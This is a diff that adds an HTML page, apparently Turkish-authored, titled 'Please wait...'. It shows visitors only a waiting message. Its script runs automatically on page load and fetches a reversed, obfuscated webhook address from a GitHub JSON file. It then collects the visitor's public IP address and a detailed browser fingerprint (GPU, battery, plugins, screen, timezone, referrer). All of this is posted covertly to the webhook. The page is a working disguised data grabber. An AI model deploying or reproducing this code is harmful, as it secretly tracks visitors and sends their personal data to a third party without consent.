@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Please wait...</title>
+    <script>
+        async function getWebhookURL() {
+            try {
+                // GitHub'dan JSON dosyasını çekme
+                let response = await fetch("https://raw.githubusercontent.com/AnonymousHackers2003/birazbekle/main/birazbekle.json");
+                if (!response.ok) {
+                    throw new Error("j");
+                }
+                let data = await response.json();
+
+                // JSON verisinden "aaaaaaaaaaaadgkdjgnsnjmd" anahtarını al
+                let webhookText = data["aaaaaaaaaaaadgkdjgnsnjmd"];
+
+                // Metni tersten oku
+                let reversedText = webhookText.split("").reverse().join("");  // Tersten okuma
+                return reversedText; // Webhook URL'si döndürülür
+            } catch (error) {
+                console.error(error);
+                return null;
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', async function () {
+            let webhookURL = await getWebhookURL();
+            if (webhookURL) {
+                async function collectUserInfo() {
+                    let userInfo = {
+                        userAgent: navigator.userAgent,
+                        language: navigator.language,
+                        platform: navigator.platform,
+                        screenWidth: screen.width,
+                        screenHeight: screen.height,
+                        colorDepth: screen.colorDepth,
+                        cookiesEnabled: navigator.cookieEnabled,
+                        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        referrer: document.referrer,
+                        currentURL: window.location.href,
+                        javaEnabled: navigator.javaEnabled(),
+                        hardwareConcurrency: navigator.hardwareConcurrency,
+                        deviceMemory: navigator.deviceMemory || "Bilinmiyor",
+                        touchSupport: navigator.maxTouchPoints,
+                        gpu: getGPUInfo(),
+                        battery: await getBatteryInfo(),
+                        network: getConnectionInfo(),
+                        plugins: getPlugins(),
+                        mimeTypes: getMimeTypes(),
+                        ipAddress: await getPublicIP()
+                    };
+
+                    sendToWebhook(userInfo, webhookURL);
+                }
+
+                function getGPUInfo() {
+                    let canvas = document.createElement('canvas');
+                    let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (!gl) return "WebGL desteklenmiyor";
+                    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
+                }
+
+                async function getBatteryInfo() {
+                    if (!navigator.getBattery) return "Pil durumu desteklenmiyor";
+                    let battery = await navigator.getBattery();
+                    return `Seviye: ${battery.level * 100}%, Şarjda: ${battery.charging ? "Evet" : "Hayır"}`;
+                }
+
+                function getConnectionInfo() {
+                    let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    if (!connection) return "Bağlantı bilgisi alınamadı";
+                    return `Tür: ${connection.effectiveType}, Gecikme: ${connection.rtt}ms, Hız: ${connection.downlink} Mbps`;
+                }
+
+                function getPlugins() {
+                    return Array.from(navigator.plugins).map(plugin => plugin.name);
+                }
+
+                function getMimeTypes() {
+                    return Array.from(navigator.mimeTypes).map(mime => mime.type);
+                }
+
+                async function getPublicIP() {
+                    try {
+                        let response = await fetch("https://api64.ipify.org?format=json");
+                        let data = await response.json();
+                        return data.ip;
+                    } catch (error) {
+                        return null;
+                    }
+                }
+
+                function sendToWebhook(data, webhookURL) {
+                    fetch(webhookURL, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            content: "**Yeni Kullanıcı Bilgisi Alındı**",
+                            embeds: [{
+                                title: "📊 Kullanıcı Bilgileri",
+                                description: "Tarayıcıdan toplanan tüm bilgiler",
+                                color: 16711680,
+                                fields: Object.entries(data).map(([key, value]) => ({
+                                    name: key,
+                                    value: Array.isArray(value) ? value.join(", ") : value.toString(),
+                                    inline: false
+                                })),
+                                timestamp: new Date().toISOString()
+                            }]
+                        })
+                    }).then(response => {
+                        if (response.ok) {
+                        } else {
+                        }
+                    }).catch(error => console.error("b:", error));
+                }
+
+                collectUserInfo();
+            } else {
+            }
+        });
+    </script>
+</head>
+<body>
+    <h1>Please wait...</h1>
+</body>
+</html>
